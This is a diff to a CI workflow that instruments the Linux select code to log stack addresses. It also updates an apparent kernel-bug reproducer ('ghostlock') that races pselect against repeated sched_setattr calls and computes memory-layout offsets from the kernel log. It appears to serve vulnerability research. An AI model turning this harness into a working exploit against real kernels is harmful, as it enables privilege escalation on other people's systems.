@@ -97,10 +97,10 @@ jobs:
           for needle in ('ret = do_select(n, &fds, end_time);',
                          'ret = do_select(n, &fds, &end_time);'):
               if needle in g:
-                  cap = ("pr_info(\"DBG stack_fds=%px\\n\", &fds);\n\t"
-                         "ghostlock_scratch[1] = (unsigned long)&fds;\n\t"
-                         "pr_info(\"DBG delta=%ld\\n\","
-                         " (long)ghostlock_scratch[1] - (long)ghostlock_scratch[0]);\n\t"
+                  cap = ("pr_info(\"DBG stack_fds_arr=%px\\n\", (void *)&stack_fds[0]);\n\t"
+                         "ghostlock_scratch[1] = (unsigned long)&stack_fds[0];\n\t"
+                         "pr_info(\"DBG shift=%ld\\n\", "
+                         "((long)ghostlock_scratch[0] - (long)ghostlock_scratch[1]) / 8);\n\t"
                          + needle)
                   g = g.replace(needle, cap, 1)
                   open('linux-g/fs/select.c', 'w').write(g)
@@ -212,14 +212,18 @@ jobs:
 
           static void *consumer_fn(void *a) {
             while (!ghost_go) usleep(1000);
-            usleep(50000);
-            struct sched_attr_x attr;
-            memset(&attr, 0, sizeof(attr));
-            attr.size = sizeof(attr);
-            attr.sched_policy = SCHED_NORMAL;
-            attr.sched_nice = 1;
-            long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
-            printf("REPRO consumer sched_setattr tid=%d ret=%ld errno=%d idx=%d\n", waiter_tid, r, errno, dance_idx);
+            usleep(100000);
+            /* 对齐原版：pselect 期间反复 sched_setattr 触发链行走 */
+            for (int i = 0; i < 20 && !consumer_done; i++) {
+              struct sched_attr_x attr;
+              memset(&attr, 0, sizeof(attr));
+              attr.size = sizeof(attr);
+              attr.sched_policy = SCHED_NORMAL;
+              attr.sched_nice = (i % 19) + 1;
+              long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
+              printf("REPRO consumer sched_setattr i=%d tid=%d ret=%ld errno=%d idx=%d\n", i, waiter_tid, r, errno, dance_idx);
+              usleep(10000);
+            }
             consumer_done = 1;
             return NULL;
           }
@@ -257,7 +261,7 @@ jobs:
             }
             dup2(high_read, 319);
             FD_SET(319, &ex);
-            struct timespec ts = { .tv_sec = 3, .tv_nsec = 0 };
+            struct timespec ts = { .tv_sec = 5, .tv_nsec = 0 };
             printf("REPRO pselect enter shift=%d idx=%d\n", word_shift, dance_idx);
             ghost_go = 1;
             int r = pselect(320, &in, &out, &ex, &ts, NULL);
@@ -340,22 +344,19 @@ jobs:
             return edeadlk ? 35 : rq;
           }
 
-          static void find_delta(unsigned long *qwaiter, unsigned long *sfds, long *pdelta) {
-            *qwaiter = *sfds = 0; *pdelta = 0;
-            /* SYSLOG_ACTION_READ_ALL(3): 读整个 ring buffer，非消费、无 <n> 前缀 */
-            long sz = syscall(SYS_syslog, 3, NULL, 0);
-            if (sz <= 0 || sz > (1<<20)) {
-              printf("REPRO klog size fail sz=%ld errno=%d\n", sz, errno);
-              return;
-            }
-            char *buf = malloc((size_t)sz + 1);
+          static void find_delta(unsigned long *qwaiter, unsigned long *sfds, long *pshift) {
+            *qwaiter = *sfds = 0; *pshift = 0;
+            /* SYSLOG_ACTION_READ_ALL(3): 读整个 ring buffer，非消费。
+               4.14 内核不接受 len=0 的 size 查询（EINVAL），直接给 1MB 缓冲 */
+            const size_t cap = 1 << 20;
+            char *buf = malloc(cap);
             if (!buf) { printf("REPRO malloc fail\n"); return; }
-            long n = syscall(SYS_syslog, 3, buf, (int)sz);
-            if (n < 0) { printf("REPRO klog read fail n=%ld errno=%d\n", n, errno); free(buf); return; }
+            long n = syscall(SYS_syslog, 3, buf, (int)cap);
+            if (n <= 0) { printf("REPRO klog read fail n=%ld errno=%d\n", n, errno); free(buf); return; }
             buf[n] = 0;
             char *p = buf;
-            while ((p = strstr(p, "DBG delta=")) != NULL) {
-              *pdelta = strtol(p + 10, NULL, 10);
+            while ((p = strstr(p, "DBG shift=")) != NULL) {
+              *pshift = strtol(p + 10, NULL, 10);
               p += 10;
             }
             p = buf;
@@ -364,12 +365,12 @@ jobs:
               p += 14;
             }
             p = buf;
-            while ((p = strstr(p, "DBG stack_fds=")) != NULL) {
-              *sfds = strtoull(p + 14, NULL, 16);
-              p += 14;
+            while ((p = strstr(p, "DBG stack_fds_arr=")) != NULL) {
+              *sfds = strtoull(p + 18, NULL, 16);
+              p += 18;
             }
-            printf("REPRO delta parse q_waiter=%016lx stack_fds=%016lx klog_delta=%ld klog_bytes=%ld\n",
-                   *qwaiter, *sfds, *pdelta, n);
+            printf("REPRO delta parse q_waiter=%016lx stack_fds=%016lx klog_shift=%ld klog_bytes=%ld\n",
+                   *qwaiter, *sfds, *pshift, n);
             if (!*qwaiter) {   /* debug: dump tail of klog */
               printf("REPRO klog tail: %.600s\n", buf + (n > 600 ? n - 600 : 0));
             }
@@ -386,16 +387,16 @@ jobs:
             printf("REPRO measure\n");
             run_measure(0);
 
-            unsigned long qwaiter = 0, sfds = 0; long pdelta = 0;
-            find_delta(&qwaiter, &sfds, &pdelta);
+            unsigned long qwaiter = 0, sfds = 0; long pshift = 0;
+            find_delta(&qwaiter, &sfds, &pshift);
             int shift = -1;
-            if (pdelta > 0 && (pdelta % 8) == 0 && (pdelta / 8) < 40) {
-              shift = (int)(pdelta / 8);
-              printf("REPRO computed shift=%d (from klog delta=%ld)\n", shift, pdelta);
+            if (pshift >= 0 && pshift < 6) {
+              shift = (int)pshift;
+              printf("REPRO computed shift=%d (from klog shift=%ld)\n", shift, pshift);
             } else if (qwaiter && sfds) {
               long d = (long)(qwaiter - sfds);
               printf("REPRO raw delta=%ld\n", d);
-              if (d >= 0 && (d % 8) == 0 && (d / 8) < 40)
+              if (d >= 0 && (d % 8) == 0 && (d / 8) < 6)
                 shift = (int)(d / 8);
             }
             printf("REPRO computed shift=%d\n", shift);
